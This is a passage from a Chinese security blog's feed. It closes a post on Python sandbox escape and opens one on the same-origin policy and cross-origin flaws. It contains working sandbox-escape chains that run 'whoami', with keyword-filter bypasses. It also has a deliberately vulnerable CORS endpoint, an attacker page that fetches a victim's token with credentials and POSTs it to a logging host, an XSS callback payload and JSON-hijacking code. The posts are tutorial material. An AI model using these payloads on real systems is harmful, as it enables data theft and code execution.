class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路四实例"><a href="#思路四实例" class="headerlink" title="思路四实例"></a>思路四实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].append.__class__.__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>有些时候并不是删掉了某个危险模块，而是设置了一个输入关键字黑名单。如果是利用链中的字符串类型可以通过拼接、编码、倒序等多种方式绕过，如果是方法或属性可以通过同义替换绕过。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拼接</span></span><br><span class="line"><span class="string">&quot;__im&quot;</span>+<span class="string">&quot;port__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).sy&quot;</span>+<span class="string">&quot;stem(&#x27;who&quot;</span>+<span class="string">&quot;ami&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">eval(chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">105</span>)+chr(<span class="number">109</span>)+chr(<span class="number">112</span>)+chr(<span class="number">111</span>)+chr(<span class="number">114</span>)+chr(<span class="number">116</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">111</span>)+chr(<span class="number">115</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>)+chr(<span class="number">46</span>)+chr(<span class="number">115</span>)+chr(<span class="number">121</span>)+chr(<span class="number">115</span>)+chr(<span class="number">116</span>)+chr(<span class="number">101</span>)+chr(<span class="number">109</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">119</span>)+chr(<span class="number">104</span>)+chr(<span class="number">111</span>)+chr(<span class="number">97</span>)+chr(<span class="number">109</span>)+chr(<span class="number">105</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>))</span><br><span class="line"><span class="comment"># 倒序</span></span><br><span class="line"><span class="string">&quot;)&#x27;imaohw&#x27;(metsys.)&#x27;so&#x27;(__tropmi__&quot;</span>[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h3 id="中括号"><a href="#中括号" class="headerlink" title="中括号"></a>中括号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [].__class__.__bases__[0].__subclasses__()[37]</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="点号"><a href="#点号" class="headerlink" title="点号"></a>点号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),<span class="string">&#x27;__class__&#x27;</span>),<span class="string">&#x27;__bases__&#x27;</span>),<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">0</span>),<span class="string">&#x27;__subclasses__&#x27;</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;class&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;bases&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;getitem&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(<span class="number">0</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;subclasses&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><p>只过滤引号的话可以利用一些通过序号取值的方法，但是如果点号不能用就得用getattr，而getattr又需要用到引号。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Python 沙箱逃逸的经验总结</a></p><p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Python 沙箱逃逸</a></p><p><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/">Python沙箱逃逸总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。&lt;/p&gt;
&lt;h2 id=&quot;导入模块&quot;&gt;&lt;a href=&quot;#导入模块&quot; class=&quot;headerlink&quot; title=&quot;导入模块&quot;&gt;&lt;/a&gt;导入模块&lt;/h2&gt;&lt;p&gt;Python导</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python" scheme="https://hosch3n.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>同源策略与跨域漏洞</title>
    <link href="https://hosch3n.github.io/2020/08/26/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/"/>
    <id>https://hosch3n.github.io/2020/08/26/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-26T08:48:53.000Z</published>
    <updated>2020-12-06T08:50:54.329Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为同源"><a href="#何为同源" class="headerlink" title="何为同源"></a>何为同源</h2><p>如果两个URL的协议、域名、端口一致则满足同源，<code>http</code>与<code>https</code>、<code>a.x.com</code>与<code>b.x.com</code>、<code>:80</code>与<code>:81</code>均不符合同源条件。通过<code>windows.open()</code>等方式打开的<code>about:blank</code>空白页将继承上级的源</p><ul><li>IE浏览器中，两个相互信任的白名单域名之间、以及不同端口均不受同源策略限制</li></ul><h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>在处理前后端分离、跨站请求等业务时可能会涉及跨域访问，浏览器出于安全考虑将拦截跨域请求的响应结果（但不会阻止发出跨域请求），除非存在相应的CORS响应头</p><p>满足CORS条件后，浏览器继续将跨域请求细分为 简单型请求 与 预检型请求。只有满足特定HTTP头的<code>GET</code>、<code>POST</code>、<code>HEAD</code>请求为简单请求，否则为预检请求，具体条件见参考链接2</p><p>简单型请求会直接发起请求并响应结果，但预检型请求发起前浏览器会先发起<code>OPTIONS</code>请求用作校验。预检型请求的响应将包含<code>Access-Control-Max-Age</code>响应头用于说明有效时间（秒），在有效时间内不必再次发起预检请求</p><p>若<code>XMLHttpRequest</code>对象的<code>withCredentials</code>属性被设置为<code>true</code>，或是向<code>fetch()</code>方法的<code>init</code>对象传递了<code>credentials: &#39;include&#39;</code>，则其在发送请求时会附带Cookies。但如果响应头缺少<code>Access-Control-Allow-Credentials: true</code>，则浏览器不会展现响应内容</p><ul><li>带Cookies的请求，服务器的<code>Access-Control-Allow-Origin</code>不能为<code>*</code>，即浏览器不会展现如下响应头组合的页面：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></table></figure><h3 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h3><p>有<code>src</code>属性的标签都是可以发起跨域请求的，但仅限于对其原本内容的引用，而不可以对跨域加载的资源进行读写</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONPadding是一个精妙的民间花式跨域方法，通过回调函数配合JSON数据填充来实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com --&gt;</span><br><span class="line"><span class="comment">// 原生JS形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;//b.x.com/?callback=fun&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.getJSON形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $.getJSON(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.ajax形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">&quot;get&quot;</span>, <span class="comment">// 请求方法JSONP默认GET，POST也会转GET</span></span><br><span class="line">            async: <span class="literal">false</span>, <span class="comment">// 异步请求JSONP默认false，true也会转false</span></span><br><span class="line">            url: <span class="string">&quot;//b.x.com/&quot;</span>,</span><br><span class="line">            <span class="comment">// data: &#123;&quot;code&quot; : &quot;CA1405&quot;&#125;, // 传入参数</span></span><br><span class="line">            dataType: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">            jsonp: <span class="string">&quot;callback&quot;</span>,</span><br><span class="line">            <span class="comment">// jsonpCallback:&quot;flightHandler&quot;, // 回调函数名jQuery默认随机，也可以写&quot;?&quot;</span></span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="built_in">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.get形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">$.get(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;<span class="comment">/* ... */</span>&#125;, <span class="string">&#x27;jsonp&#x27;</span>);  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- b.x.com --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#x27;</span>.json_encode($data).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="子仗父势"><a href="#子仗父势" class="headerlink" title="子仗父势"></a>子仗父势</h3><p>如果显式地将<code>a.x.com</code>、<code>b.x.com</code>与<code>x.com</code>的<code>document.domain</code>属性同时设置为<code>x.com</code>，则可以同时满足同源条件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    - 此赋值会重写端口为NULL </span></span><br><span class="line"><span class="comment">    - 不影响 XMLHttpRequest 与 fetch</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// a.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="边缘试探"><a href="#边缘试探" class="headerlink" title="边缘试探"></a>边缘试探</h3><p><code>window.name</code>属性伴随一个window的整个声明周期，在此期间iframe内载入的所有页面共享同一个<code>window.name</code>值</p><p><code>postMesage</code>配合监听事件、<code>location.hash</code>配合中间页均有一定跨域效果</p><h2 id="攻击思路一"><a href="#攻击思路一" class="headerlink" title="攻击思路一"></a>攻击思路一</h2><p>若为了方便直接将Origin请求头拼接进CORS响应头，会导致CORS跨域漏洞。假设<code>a.x.com/index.php</code>负责校验身份并设置Cookie，<code>a.x.com/cors.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]) ? $_POST[<span class="string">&#x27;user&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$passwd = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]) ? $_POST[<span class="string">&#x27;passwd&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($user===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $passwd===<span class="string">&#x27;passwd&#x27;</span>) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;user&#x27;</span>] = $user;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;logout&#x27;</span>]===<span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/json.php?callback=jsonp&quot;&gt;用户信息A&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/cors.php&quot;&gt;用户信息B&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/index.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;悲催的A&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;margin-left: 100px&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form id=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        账户：&lt;input id=&quot;user&quot; type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        密码：&lt;input id=&quot;passwd&quot; type=&quot;password&quot; name=&quot;passwd&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;user&#x27;</span>].<span class="string">&#x27;登录成功&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/cors.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.$_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;)&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;请求失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        fetch(<span class="string">&#x27;//a.x.com/cors.php&#x27;</span>, &#123;</span><br><span class="line">            credentials: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.text();</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">datas</span>) </span>&#123;</span><br><span class="line">            fetch(<span class="string">&#x27;//WebLog/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: JSON.stringify(datas)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_ac.png"></p><ul><li><p>Chromium从Ver.80开始Cookies的SameSite默认为Lax，即会默认拦截跨域Cookie（感谢phithon师傅的强势指导），Firefox 68.6可以复现</p></li><li><p>可通过<code>Set-Cookie: SameSite=None; Secure</code>响应头显式地允许通过HTTPS传输跨域Cookie</p></li></ul><h2 id="攻击思路二"><a href="#攻击思路二" class="headerlink" title="攻击思路二"></a>攻击思路二</h2><p>当JSONP的动态处理页未设置<code>Content-Type</code>响应头时其默认为<code>text/html</code>，可能会导致反射XSS：<code>?callback=xss&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>将JSONP的动态处理页<code>Content-Type</code>响应头设置为<code>application/json</code>便可以防御反射XSS，但仍可能存在JSONP数据劫持</p><p>在讲JSONP数据劫持之前，先了解一下曾出现过的JSON数据劫持。假设<code>json.x.com</code>在校验登录成功后，会向客户端返回<code>account</code>之类的数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;account&quot;</span>: <span class="string">&quot;admin@x.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;...&quot;</span>: <span class="string">&quot;...&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取其之前的JSON数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype,<span class="string">&quot;account&quot;</span>,&#123;</span></span><br><span class="line"><span class="javascript">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;json.x.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码通过重写Object类的set方法实现了对<code>account</code>属性的hook，目前该漏洞已被修复，可以通过本地测试来管中窥豹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">&quot;Id&quot;</span>, &#123;</span><br><span class="line">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        alert(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样怼属性可以</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.Id = <span class="number">666</span>;</span><br><span class="line"><span class="comment">// 这个JSON就不行了</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;<span class="string">&quot;Id&quot;</span>:<span class="number">250</span>&#125;;</span><br></pre></td></tr></table></figure><p>看完了被修复的JSON劫持，再来看看目前依然存在的JSONP劫持。假设<code>a.x.com/index.php</code>负责校验身份并调用数据接口，<code>a.x.com/json.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 